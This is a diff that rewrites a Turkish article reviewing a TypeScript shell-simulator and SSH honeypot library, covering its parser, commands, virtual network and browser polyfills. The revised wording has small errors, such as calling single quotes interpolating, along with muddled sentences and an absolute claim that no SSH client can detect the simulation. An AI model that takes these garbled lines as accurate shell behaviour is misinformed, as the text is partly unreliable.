+Kabuk sözdizimi ayrıştırıcısı tipli AST üretir:
 
 ```ts
-// "ls /etc | grep root && echo done" şuna ayrıştırılır:
+// "ls /etc | grep root && echo done" şuna ayrışır:
 {
   type: "statement",
   pipeline: [
@@ -795,22 +795,22 @@ Shell ayrıştırıcısı tipli bir AST üretir:
 }
 ```
 
-Yürütücü bu AST'de yürür:
-- Bir pipeline için, bir `{ stdin, stdout, stderr }` akış zinciri oluşturur ve her komutu borulu G/Ç ile yürütür
-- Mantıksal operatörler (`&&`, `||`) için, sağ tarafı çalıştırmadan önce sol taraftan sonra `$?` kontrol eder
-- Alt shell'ler (`$(...)`, `` ` ` ``) için, yürütme context'ini fork eder
-- Yönlendirmeler (`>file`, `>>file`, `2>&1`, `<file`) için, yürütmeden önce akış bağlantısını kurar
-- Arka plan işleri (`cmd &`) için, tamamlanmasını beklemeden çalıştırır
-- Değişkenler için, `$VAR`, `${VAR:-default}`, `${#VAR}` ve aritmetik `$((expr))` ifadelerini genişletir
-- Süslü parantez genişletmesi (`{a,b,c}`, `{1..5}`) için, yürütmeden önce tam genişletme listesini üretir
+Yürütücü bu ASTyi gezer:
+- Pipeline için `{ stdin, stdout, stderr }` akış zinciri yaratır ve her komutu pipelı G/Ç ile çalıştırır
+- Mantıksal işleçler (`&&`, `||`) için sağı çalıştırmadan önce soldan sonra `$?` kontrol eder
+- Alt kabuklar (`$(...)`, `` ` ` ``) için yürütme bağlamını çatallar
+- Yönlendirmeler (`>dosya`, `>>dosya`, `2>&1`, `<dosya`) için yürütmeden önce akış kablolamasını ayarlar
+- Arka plan görevleri (`cmd &`) için bitmesini beklemeden çalışır
+- Değişkenler için `$VAR`, `${VAR:-default}`, `${#VAR}` ve aritmetik `$((expr))` genişletir
+- Küme genişletme (`{a,b,c}`, `{1..5}`) için çalıştırmadan önce tam genişleme listesi üretir
 
-Tüm bunlar gerçek POSIX shell davranışıdır. Ayrıştırıcı heredoc'ları, süreç ikamesini, globbing'i (`*`, `?`, `[abc]`) ve tırnak işlemeyi (tek tırnak, enterpolasyonlu çift tırnak, ters eğik çizgi kaçışı) işler. Mükemmel değildir -- uç durumlar vardır -- ama bir TypeScript projesinden bekleyeceğinin çok ötesindedir.
+Bunların hepsi gerçek POSIX kabuk davranışıdır. Ayrıştırıcı heredocları, süreç ikamesini, globbingi (`*`, `?`, `[abc]`) ve tırnak yönetimini işler ( enterpolasyonlu tek tırnaklar, çift tırnaklar, ters bölü kaçışı). Mükemmel değildir: uç durumlar vardır: ama TypeScript projesinden bekleyeceğinden çok ötededir.
 
 ### ~170 yerleşik komut
 
-Komutlar, bir komut kaydına kayıtlı TypeScript fonksiyonlarıdır. stdin/stdout/stderr akışları, VFS, kullanıcı oturumu, shell ortamı ve alt modüllere erişim içeren bir `CommandContext` alırlar.
+Komutlar komut kaydına kayıtlı TypeScript fonksiyonlarıdır. stdin/stdout/stderr akışları, VFS, kullanıcı oturumu, kabuk ortamı ve alt modüllere erişimli `CommandContext` alırlar.
 
-170 Unix komut uygulaması yazmak... çok şeydir. Bazıları önemsizdir (`echo`, `true`, `false`), bazıları şaşırtıcı derecede karmaşıktır (`awk`, `find`, `tar`). Yani, tam POSIX `awk`? TypeScript'te? Bu delice, dürüst olmak gerekirse. İşte içinde olanlardan bir örnek:
+170 Unix komut uygulaması yazmak... çoktur. Bazıları önemsizdir (`echo`, `true`, `false`), bazıları şaşırtıcı karmaşıktır (`awk`, `find`, `tar`). Yani eksiksiz POSIX `awk` mı? TypeScriptte? Bu dürüstçe çılgıncadır. İşte içindekilerden örnek:
 
 ```
 cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
@@ -818,23 +818,23 @@ ln, readlink, find, locate, stat, file,
 echo, printf, read, test, [, [[,
 grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
 ps, top, kill, pkill, nice, ionice,
-ssh, scp, sftp (istemci tarafı, dışarı bağlanan),
+ssh, scp, sftp (istemci tarafı, giden bağlantı),
 ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
 apt, apt-get, apt-cache, dpkg, pacman,
 useradd, usermod, userdel, groupadd, passwd, su, sudo,
 tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
-git (taslak), python3 (taslak), node (taslak),
-nano (tam etkileşimli düzenleyici), vim (temel), vi (temel),
+git (saplama), python3 (saplama), node (saplama),
+nano (eksiksiz etkileşimli editör), vim (temel), vi (temel),
 neofetch, htop, tree, df, du, free, uptime, who, w, last,
-cron (simüle edilmiş), systemctl (taslak), journalctl (taslak),
-...ve ~130 tane daha
+cron (simüle), systemctl (saplama), journalctl (saplama),
+...ve yaklaşık 130 tane daha
 ```
 
-"Taslak"lar (git, python3, node), yaygın kullanımlara gerçekçi yanıt verir -- `python3 --version` inandırıcı bir sürüm dizesi döndürür, `git status` sahte bir repo durumu gösterir -- gerçek bir iş yapmadan. Bir honeypot için bunlar aslında gerçek şeylerden daha kullanışlıdır, çünkü saldırganların gerçekten zararlı bir şey çalıştırmadan ne çalıştırmaya çalıştıklarını gözlemlemeni sağlarlar.
+"Saplamalar" (git, python3, node) yaygın çağrılara gerçekçi yanıt verir: `python3 --version` inandırıcı sürüm dizesi döndürür, `git status` sahte depo durumu gösterir: gerçek iş yapmadan. Honeypot için aslında gerçek komutlardan daha faydalıdır çünkü saldırganların tehlikeli bir şey çalıştırmadan neyi çalıştırmaya çalıştığını gözlemlemeye izin verir.
 
 ### SSH sunucusu
 
-SSH katmanı, gerçek `ssh2` npm paketini kullanır -- gerçek SSH protokolü, gerçek anahtar değişimi, gerçek şifreleme. `SSHMimic` onu sarar:
+SSH katmanı gerçek npm `ssh2` paketi kullanır: gerçek SSH protokolü, gerçek anahtar değişimi, gerçek şifreleme. `SSHMimic` onu sarar:
 
 ```ts
 import { VirtualSshServer } from "typescript-virtual-container";
@@ -849,16 +849,16 @@ const ssh = new VirtualSshServer({
   },
 });
 await ssh.start();
-// Gerçek SSH: ssh -p 2222 root@localhost
-// Gerçek SFTP: sftp -P 2222 root@localhost
-// Gerçek SCP: scp -P 2222 file root@localhost:/tmp/
+// Gerçek SSH : ssh -p 2222 root@localhost
+// Gerçek SFTP : sftp -P 2222 root@localhost
+// Gerçek SCP : scp -P 2222 file root@localhost:/tmp/
 ```
 
-`shellProperties`, `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` ve `/etc/os-release`'in ne bildireceğini belirler. Herhangi bir Linux dağıtımını ve çekirdek sürümünü inandırıcı bir şekilde taklit edebilirsin -- gerçek bir SSH istemcisine farkı söylemenin kesinlikle hiçbir yolu yoktur.
+`shellProperties`, `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` ve `/etc/os-release` ne raporlar belirler. Herhangi Linux dağıtımı ve çekirdek sürümünü ikna edici taklit edebilirsin: gerçek SSH istemcisi için kelimenin tam anlamıyla farkı anlamanın yolu yoktur.
 
 ### HoneyPot modülü
 
-Shell yorumlayıcı gerçek ve SSH sunucusu gerçek olduğu için, saldırgan komutları sanal ortamda gerçekten yürütülür. Saldırgan tarafından tetiklenen `wget` istekleri, hedef URL'lerle birlikte günlüğe kaydedilir. Saldırgan tarafından oluşturulan dosyalar VFS'de kaydedilir. Saldırganın izin yükseltme girişimleri gerçekçi hatalar üretir.
+Kabuk yorumlayıcı gerçek ve SSH sunucusu gerçek olduğu için saldırgan komutları sanal ortamda gerçekten çalışır. Saldırganca tetiklenen `wget` istekleri hedef URLlerle günlüğe kaydedilir. Saldırganca oluşturulan dosyalar VFSye kaydedilir. Saldırganın yetki yükseltme girişimleri gerçekçi hatalar üretir.
 
 ```ts
 import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";
@@ -872,7 +872,7 @@ const pot = new HoneyPot({
 const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
 await ssh.start();
 
-// Bir oturumdan sonra, dosya sisteminin diff'ini al
+// Oturum sonrası dosya sistemini karşılaştır
 const before = shell.vfs.toSnapshot();
 // ... saldırgan oturumu ...
 const after = shell.vfs.toSnapshot();
@@ -886,29 +886,29 @@ const diff = diffSnapshots(before, after);
 */
 ```
 
-Bu, Cowrie'den niteliksel olarak farklıdır. Cowrie'nin sahte dosya sistemi `ls`'ye yanıt verebilir ancak bir saldırganın hangi dosyaları oluşturduğunu ve yapılandırılmış bir diff olarak hangi değişiklikleri yaptığını gerçekten takip edemez. `typescript-virtual-container` bunu yapabilir, çünkü VFS canlı bir veri yapısıdır -- her yazma işlemi takip edilir. Saldırganın az önce eklediği cron girdisi mi? Diff'te. O `.hidden` klasörü mü? Diff'te. Kötü amaçlı yazılım analizi için oldukça kullanışlı.
+Bu Cowrieden nitel farklıdır. Cowrienin sahte dosya sistemi `ls` yanıtlayabilir ama saldırganın oluşturduğu dosyaları ve yaptığı değişiklikleri yapılandırılmış diff olarak gerçekten izleyemez. `typescript-virtual-container` yapabilir çünkü VFS yaşayan bir veri yapısıdır: her yazma izlenir. Saldırganın az önce eklediği cron girdisi mi? Difftedir. `.hidden` klasörü mü? Difftedir. Zararlı yazılım analizi için epey faydalı.
 
 ### Sanal ağ yığını
 
-Bu, muhtemelen tüm projenin en etkileyici kısmıdır ve bu alandaki başka hiçbir projede benzeri yoktur. Yani, VPN desteği olan, saf TypeScript ile yazılmış, hiçbir gerçek ağ bağdaştırıcısı içermeyen tam bir L2/L3 sanal ağ yığını. Bu gerçekten çılgınca.
+Bu muhtemelen tüm projenin en etkileyici kısmıdır ve bu alandaki başka hiçbir projede eşdeğeri yoktur. Yani gerçek ağ kartı karışmadan saf TypeScript yazılmış eksiksiz L2/L3 sanal ağ yığını, VPN destekli. Gerçekten çılgınca.
 
-`VirtualNetworkManager`, her `VirtualShell` örneğine, yapılandırılabilir IP adresleri, yönlendirme tabloları ve bir yazılım güvenlik duvarı (conntrack ve NAT ile iptables tarzı kurallar) içeren sanal ağ arayüzleri verir. `ip addr`, `ip route`, `iptables -L`, `netstat -rn`'in tümü sanal ağ durumunu gösterir.
+`VirtualNetworkManager`, her `VirtualShell` örneğine yapılandırılabilir IP adresli sanal ağ arayüzleri, yönlendirme tabloları ve yazılım güvenlik duvarı (conntrack ve NATli iptables tarzı kurallar) verir. `ip addr`, `ip route`, `iptables -L`, `netstat -rn` hepsi sanal ağ durumunu gösterir.
 
-`VirtualSwitch` (Fransızca "baie informatique" -- sunucu rafı bölmesi kelimesinden gelen Baie adıyla), birden çok shell'i paylaşılan bir alt ağda birbirine bağlar. Şunları uygular:
+`VirtualSwitch` (adı Baie: sunucu kabini Fransızca kelimesinden, "baie informatique") birden çok kabuğu paylaşılan alt ağda bağlar. Şunları uygular:
 - MAC öğrenme ve ARP
 - Alt ağlar arası IP yönlendirme
 - NAT (giden maskeleme)
 - DNS (alt ağ başına yapılandırılabilir kayıtlar)
 - Yük dengeleme (round-robin, en az bağlantı)
-- Trafik şekillendirme: gecikme, jitter (Gaussian dağılımı), paket kaybı, patlama kaybı, yeniden sıralama, çoğaltma
-- Bant genişliği sınırlama (token bucket)
-- MTU zorlama
-- Bağlantı takibi (durum bilgili, NEW/ESTABLISHED/TIME_WAIT durumlarıyla)
+- Trafik şekillendirme: gecikme, titreme (gauss dağılımı), paket kaybı, toplu kayıp, yeniden sıralama, kopyalama
+- Bant genişliği sınırlama (jeton kovası)
+- MTU uygulama
+- Bağlantı izleme (durumlu, NEW/ESTABLISHED/TIME_WAIT durumları)
 
 ```ts
 const baie = new Baie("192.168.0.0/24");
 
-// Aynı switch'te üç sanal makine
+// Aynı anahtarda üç sanal makine
 const web = new VirtualShell("web");
 const api = new VirtualShell("api");
 const db  = new VirtualShell("db");
@@ -917,29 +917,29 @@ baie.attach(web, "192.168.0.2");
 baie.attach(api, "192.168.0.3");
 baie.attach(db,  "192.168.0.4");
 
-// Güvenlik duvarı: web api'ye ulaşabilir, api db'ye ulaşabilir, web db'ye doğrudan ulaşamaz
+// Güvenlik duvarı: web apiye ulaşabilir, api dbye ulaşabilir, web dbye doğrudan ulaşamaz
 baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });
 
-// Trafik şekillendirme: dışarıya dengesiz bir WAN bağlantısını simüle et
+// Trafik şekillendirme: dışarıya kararsız WAN bağı simüle et
 baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
 ```
 
-`VirtualVpn`, Baie örnekleri arasında şifreli tüneller oluşturur -- siteler arasında VPN ara bağlantıları olan çoklu site ağını simüle edebilirsin.
+`VirtualVpn`, Baie örnekleri arasında şifreli tüneller yaratır: siteler arası VPN bağlantılı çok siteli ağ simüle edebilirsin.
 
-`VirtualProxy`, port yönlendirme ve bir SOCKS5 proxy'si uygular.
+`VirtualProxy`, port yönlendirme ve SOCKS5 vekili uygular.
 
-Bunların hiçbiri gerçek bir ağ bağdaştırıcısına dokunmaz. Hepsi TypeScript nesne yönlendirmesidir. `ping` komutu, sanal switch üzerinden yönlendirilerek ve simüle edilmiş ICMP yanıtları döndürülerek "çalışır". `curl http://192.168.0.3/api`, sanal ağ üzerinden yönlendirilir, api shell'inin simüle edilmiş HTTP yanıtına çarpar ve içeriği döndürür. Mümkün olan en iyi şekilde, sonuna kadar kaplumbağalar.
+Bunların hiçbiri gerçek ağ kartına dokunmaz. Hepsi TypeScript nesne yönlendirmedir. `ping` komutu sanal anahtar üzerinden yönlendirilip simüle ICMP yanıtları döndürerek "çalışır". `curl http://192.168.0.3/api` sanal ağ üzerinden yönlendirilir, api kabuğunun simüle HTTP yanıtına ulaşır ve içeriği döndürür. En iyi anlamda sonuna kadar kaplumbağalardır.
 
-### SandboxedShell
+### `SandboxedShell`
 
-Daha güçlü izolasyon gerektiren programatik kullanım için, `SandboxedShell` bir Node.js Worker thread'inde bir shell oturumu çalıştırır:
+Daha güçlü izolasyona ihtiyaç duyulan programatik kullanım için `SandboxedShell` kabuk oturumunu Node.js Worker threadinde çalıştırır:
 
 ```ts
 import { SandboxedShell } from "typescript-virtual-container";
 
 const shell = new SandboxedShell({
   memoryMB: 128,
-  cpuQuota: 0.25, // bir çekirdeğin %25'i
+  cpuQuota: 0.25, // çekirdeğin %25i
   timeoutMs: 5000,
 });
 
@@ -948,11 +948,11 @@ console.log(result.stdout); // "42\n"
 console.log(result.exitCode); // 0
 ```
 
-Buradaki izolasyon, VFS katmanı (worker thread'in shell'i yalnızca sanal dosya sistemini görebilir, asla ana bilgisayar dosya sistemini göremez) artı Node.js Worker thread bellek izolasyonu ile zorlanır. Bu, `isolated-vm`'den daha hafiftir ancak JS seviyesi izolasyondan ziyade shell seviyesi izolasyon için daha uygundur.
+Burada izolasyon VFS katmanı (worker thread kabuğu yalnızca sanal dosya sistemini görebilir, ana dosya sistemini asla) artı Node.js Worker thread bellek izolasyonuyla sağlanır. `isolated-vm`den hafiftir ama JS seviyesinden çok kabuk seviyesi izolasyon için daha uygundur.
 
 ### Kaynak sınırlama
 
-Sistem izleme komutlarının ne bildireceğini etkileyen, shell başına kaynak sınırları yapılandırabilirsin:
+Komutları raporlayan sistem izleme komutlarını etkileyen kabuk başına kaynak limitleri yapılandırabilirsin:
 
 ```ts
 const shell = new VirtualShell("limited-vm", {}, {}, {
@@ -961,38 +961,38 @@ const shell = new VirtualShell("limited-vm", {}, {}, {
 });
 ```
 
-Bu shell'in içinde, `free -m` toplam 512 MB RAM gösterir. `nproc` 2 döndürür. `/proc/meminfo` sınırlanmış değerleri gösterir. `htop` ve `top` sınırlanmış CPU sayısını gösterir. Bu, sahte makinenin donanım profilini hassas bir şekilde parmak iziyle belirlemeni sağlar.
+Bu kabuk içinde `free -m` 512 MB toplam RAM gösterir. `nproc` 2 döndürür. `/proc/meminfo` sınırlı değerleri gösterir. `htop` ve `top` sınırlı CPU sayısını gösterir. Simüle makinenin donanım ayak izini kesin tanımlamaya izin verir.
 
 ### Üç dağıtım modu
 
 ```
-Mod 1: SSH/SFTP sunucusu
+Mod 1 : SSH/SFTP Sunucusu
   VirtualSshServer / VirtualSftpServer
   → Gerçek SSH protokolü, gerçek SFTP, gerçek SCP
-  → Kullanım alanı: honeypot'lar, uzak test ortamları, eğitim laboratuvarları
+  → Kullanım durumları: honeypotlar, uzak test ortamları, eğitim laboratuvarları
 
-Mod 2: Web shell (tarayıcı)
+Mod 2 : Web kabuğu (tarayıcı)
   builds/fortune-nyx-v1.7.8-web.min.js (ESM paketi)
-  → Tarayıcıda çalışır, VFS IndexedDB'de kalıcıdır
-  → Kullanım alanı: etkileşimli eğitimler, gömülü terminaller, demolar
-  → Bonus: tam simüle edilmiş bir XFCE masaüstü için startxfce4 çalıştır
+  → Tarayıcıda döner, IndexedDBde kalıcı VFS
+  → Kullanım durumları: etkileşimli öğreticiler, gömülü terminaller, demolar
+  → Bonus: tam simüle XFCE masaüstü için startxfce4 çalıştırır
 
-Mod 3: Bağımsız CLI
+Mod 3 : Bağımsız CLI
   builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (tek dosya, kurulum yok)
-  → curl ile çalıştır, VFS'yi .vfs/ dizininde kalıcı yap
-  → Kullanım alanı: hızlı demolar, yerel deneyler
+  → curl ile çalıştır, VFSyi .vfs/ dizininde kalıcılaştır
+  → Kullanım durumları: hızlı demolar, yerel deneme
 ```
 
-### Polyfill'ler -- tarayıcı derlemesi Wasm olmadan nasıl çalışıyor
+### Polyfiller: tarayıcı derlemesi Wasmsız nasıl çalışır
 
-Tamam, bu gerçekten zekice bulduğum ve özellikle belirtmek istediğim kısım.
+Tamam bu gerçekten akıllıca bulduğum ve özel vurgulamak istediğim kısım.
 
-Bir Node.js kütüphanesini tarayıcıda çalıştırmak genellikle bir kabustur. Ya bir Wasm çalışma zamanı kullanırsın (ağır, yüklenmesi yavaş) ya da her `node:*` import'unu elle tarayıcı uyumlu bir alternatifle değiştirmek için haftalar harcarsın. Fortune ikinciyi yaptı -- ama çok temiz bir şekilde, reponun `polyfills/` dizininde yaşayan bir dizi özel polyfill yazarak.
+Node.js kütüphanesini tarayıcıda çalıştırmak genelde kâbustur. Ya Wasm çalışma ortamı kullanırsın (ağır, yavaş yüklenir) ya her `node:*` içe aktarmayı tarayıcı uyumlu alternatifle değiştirmek için haftalar harcarsın. Fortune ikinci şeyi yaptı: ama çok temiz, depodaki `polyfills/` dizininde yaşayan özel polyfill kümesi yazarak.
 
-Derleme pipeline'ı, sadece bir yığın `alias` girişi olan esbuild'dir:
+Derleme pipelineı sadece bir sürü `alias` girdili esbuilddir:
 
 ```js
-// demo/build.js -- tüm tarayıcı derleme yapılandırması
+// demo/build.js: tarayıcı derlemesinin tüm yapılandırması
 esbuild.build({
   entryPoints: ['app.ts'],
   bundle: true,
@@ -1019,17 +1019,17 @@ esbuild.build({
 });
 ```
 
-Wasm yok. Harici polyfill kütüphanesi yok. `webpack-node-externals` saçmalığı yok. Sadece takma adlı modüller ve birkaç enjekte edilmiş global. Her birini inceleyeyim çünkü bazıları gerçekten etkileyici.
+Wasm yok, harici polyfill kütüphanesi yok, `webpack-node-externals` başvurusu yok. Sadece takma adlı modüller ve birkaç enjekte global. Her birini detaylandırayım çünkü bazıları gerçekten etkileyici.
 
-**`node:fs` -- sahte dosya sistemi olarak IndexedDB**
+**`node:fs`: sahte dosya sistemi olarak IndexedDB**
 
-Bu benim favorim. `node:fs` polyfill'i, senkron Node.js fs API'sini (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) iki katmanla desteklenen şekilde uygular: senkron okumalar için bellek içi bir `Map` ve sayfa yeniden yüklemeleri arasında kalıcılık için IndexedDB. Yazmalar hemen Map'e gider (böylece `writeFileSync`'ten hemen sonra `readFileSync` her zaman çalışır), ardından arka planda asenkron olarak IndexedDB'ye aktarılır.
+Bu favorimdir. `node:fs` polyfilli Node.js senkron fs APIyi (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) iki katman destekli uygular: senkron okumalar için bellekte `Map` ve sayfa yeniden yüklemeleri arası kalıcılık için IndexedDB. Yazmalar hemen Mape gider (o yüzden `writeFileSync` hemen sonrası `readFileSync` hep çalışır), sonra arka planda asenkron IndexedDBye boşaltılır.
 
 ```js
-// Senkron önbellek (yol → Uint8Array | null) -- anında okumalar
+// Senkron önbellek (yol → Uint8Array | null): anlık okumalar
 const memCache = new Map();
 
-// Başlangıçta IndexedDB'deki her şeyi memCache'e önceden yükle
+// Başlangıçta IndexedDBden her şeyi memCache içine ön yükle
 openDB().then(db => {
   const tx = db.transaction(STORE, 'readonly');
   const req = tx.objectStore(STORE).openCursor();
@@ -1042,196 +1042,196 @@ openDB().then(db => {
 });
 ```
 
-VFS snapshot'ının tarayıcıda sayfa yeniden yüklemelerinde hayatta kalmasının nedeni budur -- tüm `.vfsb` ikili dosyası bu polyfill aracılığıyla IndexedDB'ye yazılır ve bir sonraki yüklemede geri okunur. Wasm yok. Sunucu yok. Sadece yaklaşık 2011'den beri her tarayıcıda bulunan IndexedDB.
+VFS anlık görüntüsünün tarayıcıda sayfa yeniden yüklemelerine dayanmasının nedeni budur: tüm `.vfsb` ikilisi bu polyfill üzerinden IndexedDBye yazılır ve sonraki yüklemede yeniden okunur. Wasm yok, sunucu yok. Sadece 2011den beri tüm tarayıcılarda olan IndexedDB.
 
-**`node:crypto` -- saf JS'de SHA-256**
+**`node:crypto`: saf JSde SHA-256**
 
-Bir Wasm kripto kütüphanesi çekmek yerine, kripto polyfill'i, FIPS 180-4 tur sabitlerini kullanarak SHA-256'yı sıfırdan uygular. Tam hex/base64/Uint8Array çıktı desteğiyle 166 satır saf JS. Kütüphanedeki tüm hash'leme bunun üzerinden gider -- SSH ana bilgisayar anahtarı parmak izi, iç checksum'lar, her şey. Kompakt, sıfır bağımlılık, sadece çalışır.
+Wasm kripto kütüphanesi içe aktarmak yerine kripto polyfilli FIPS 180-4 tur sabitlerini kullanarak SHA-256yı sıfırdan uygular. Tam hex/base64/Uint8Array çıktı destekli 166 satır saf JS. Kütüphanedeki tüm hashleme oradan geçer: SSH ana anahtar parmak izleri, dahili sağlama toplamları, hepsi. Kompakt, sıfır bağımlılık, çalışır.
 
-**`node:os` -- tarayıcının gerçek donanımını okur**
+**`node:os`: tarayıcının gerçek donanımını okur**
 
-Bu güzel bir dokunuş. Sert kodlanmış yer tutucu değerler döndürmek yerine, `node:os` toplam RAM için `navigator.deviceMemory` ve CPU sayısı için `navigator.hardwareConcurrency` okur. Yani tarayıcı derlemesinin içindeki `neofetch` aslında gerçek makinenle ilgili bir şey bildirir -- uydurma bir `2 çekirdek, 2GB RAM` taslağı değil.
+Bu hoş bir özen. Sabit kodlanmış sahte değerler döndürmek yerine `node:os`, toplam RAM için `navigator.deviceMemory` ve CPU sayısı için `navigator.hardwareConcurrency` okur. Yani tarayıcı derlemede `neofetch` aslında gerçek makinene karşılık gelen bir şeyi raporlar: sahte `2 çekirdek, 2 GB RAM` saplaması değil.
 
 ```js
 export function totalmem(){
   return navigator?.deviceMemory
     ? navigator.deviceMemory * 1024 * 1024 * 1024
-    : 2 * 1024 * 1024 * 1024; // 2 GB yedek
+    : 2 * 1024 * 1024 * 1024; // varsayılan 2 GB
 }
 export function cpus(){
   const n = navigator?.hardwareConcurrency || 2;
-  // ayrıca CPU model dizesini tahmin etmek için navigator.userAgent'i ayrıştırır
+  // CPU model dizesini tahmin etmek için navigator.userAgent de ayrıştırır
   return Array.from({ length: n }, () => ({ model, speed: 2400 }));
 }
 ```
 
-**`node:net`, `ssh2`, `roxify` -- dürüst taslaklar**
+**`node:net`, `ssh2`, `roxify`: dürüst saplamalar**
 
-Tarayıcı TCP soketleri açamaz veya gerçek SSH çalıştıramaz, bu yüzden bunlar, bir şey onları kullanmaya çalışırsa net bir mesajla `NotImplemented` hatası fırlatan taslaklardır. Sessiz hata yok, bir nesnenin beklendiği yerde `undefined` döndürme yok. Sadece yüksek sesli, net bir "bu tarayıcıda çalışmaz" -- tam olarak istediğin şey.
+Tarayıcı TCP soketleri açamaz ya da gerçek SSH çalıştıramaz, o yüzden bunlar bir şey onları kullanmaya çalışırsa açık mesajlı `NotImplemented` hatası fırlatan saplamalardır. Başarısızlıklar açık kalır, nesne beklenen yerde `undefined` döndürülmez. Sadece güçlü ve net "tarayıcıda çalışmaz" mesajı: ki bu tam istediğindir.
 
-**`process.js` ve `buffer.js` -- enjekte edilmiş globaller**
+**`process.js` ve `buffer.js`: enjekte globaller**
 
-Bu ikisi, esbuild'in `inject` seçeneği aracılığıyla paketlenmiş her dosyanın tepesine enjekte edilir, böylece `process` ve `Buffer` herhangi bir açık import olmadan global olarak kullanılabilir. `process.js` küçüktür: `env`, `version`, `platform: 'browser'`, `queueMicrotask` aracılığıyla `nextTick`, `performance.now()` aracılığıyla `uptime`. `buffer.js`, `Uint8Array` üzerinde tam bir `Buffer` yeniden uygulamasıdır -- SSH uygulaması ve VFS'nin dayandığı tüm `readUInt32BE`, `writeInt16LE`, hex/base64 kodlama yöntemleri.
+Bu ikisi esbuild `inject` seçeneğiyle paketin her dosyasının üstüne enjekte edilir, o yüzden `process` ve `Buffer` açık içe aktarma olmadan global kullanılabilir. `process.js` miniciktir: `env`, `version`, `platform: 'browser'`, `queueMicrotask` üzerinden `nextTick`, `performance.now()` üzerinden `uptime`. `buffer.js`, `Uint8Array` üstünde `Buffer` eksiksiz yeniden uygulamasıdır: SSH uygulamasının ve VFSin bağlı olduğu tüm `readUInt32BE`, `writeInt16LE`, hex/base64 kodlamaları.
 
 ---
 
-Tüm polyfill seti, toplamda yaklaşık 640 satır elle yazılmış JS'dir. npm paketi yok. Wasm yok. Ve sonuç, kütüphanenin kendisi olan, yerel olarak çalışan ve Node-öncelikli kütüphanelerdeki olağan "ama tarayıcıda gerçekten çalışıyor mu?" kaygısı olmayan bir tarayıcı paketidir. Eğer merak ediyorsan, repodaki `polyfills/` klasörüne bir göz atmanı öneririm -- her dosya iyi kapsüllenmiş ve kendi başına okunabilir, ki bu çok takdir ettiğim bir stil seçimi.
+Tüm polyfiller toplamda yaklaşık 640 satır elle yazılmış JS tutar. npm paketi yok, Wasm yok. Ve sonuç sadece kütüphane olan, yerel dönen tarayıcı paketidir, Node-öncelikli tasarlanmış kütüphanelerdeki alışılmış "ama tarayıcıda gerçekten çalışır mı?" kaygısı hiç yok. Meraklıysan depodaki `polyfills/` klasörüne göz atmaya değer: her dosya iyi kapsüllenmiş ve kendi başına okunabilir, çok takdir ettiğim tarz seçimi.
 
 | | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
 |---|---|---|---|---|---|---|---|---|
-| **Kategori** | JS sandbox | JS sandbox | JS sandbox | Emülatör | Emülatör | Node.js/Wasm | Honeypot | Simülatör |
-| **JS izole eder** | ⚠️ kapsam | ✅ V8 Isolate | ✅ Wasm | yok | yok | kısmi | yok | ✅ Worker |
-| **Gerçek Linux çekirdeği** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
-| **Shell yorumlayıcı** | ❌ | ❌ | ❌ | ✅ (gerçek) | ✅ (gerçek) | ✅ (gerçek) | kısmi | ✅ (özel) |
+| **Kategori** | JS Kum havuzu | JS Kum havuzu | JS Kum havuzu | Emülatör | Emülatör | Node.js/Wasm | Honeypot | Simülatör |
+| **JSyi izole eder** | ⚠️ kapsam | ✅ V8 Isolate | ✅ Wasm | uygulanamaz | uygulanamaz | kısmi | uygulanamaz | ✅ Worker |
+| **Gerçek çekirdek** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
+| **Kabuk yorumlayıcı** | ❌ | ❌ | ❌ | ✅ (gerçek) | ✅ (gerçek) | ✅ (gerçek) | kısmi | ✅ (özel) |
 | **~170 Unix komutu** | ❌ | ❌ | ❌ | ✅ | ✅ | kısmi | ~20 | ✅ |
-| **POSIX izinleri** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | kısmi | ✅ zorunlu |
-| **Kullanıcı yönetimi** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ tam |
+| **POSIX izinleri** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | kısmi | ✅ uygulanır |
+| **Kullanıcı yönetimi** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ eksiksiz |
 | **Gerçek SSH sunucusu** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
 | **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
 | **Honeypot/denetim** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
-| **VFS diff/snapshot** | ❌ | ❌ | ❌ | sınırlı | ❌ | ❌ | ❌ | ✅ |
-| **Sanal ağ L2/L3** | ❌ | ❌ | ❌ | temel | ❌ | ❌ | ❌ | ✅ tam |
+| **VFS Diff/anlık görüntü** | ❌ | ❌ | ❌ | sınırlı | ❌ | ❌ | ❌ | ✅ |
+| **L2/L3 sanal ağ** | ❌ | ❌ | ❌ | temel | ❌ | ❌ | ❌ | ✅ eksiksiz |
 | **Sanal VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
 | **Tarayıcı desteği** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
-| **Node.js yerel** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
-| **Tipli API** | temel | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ tam |
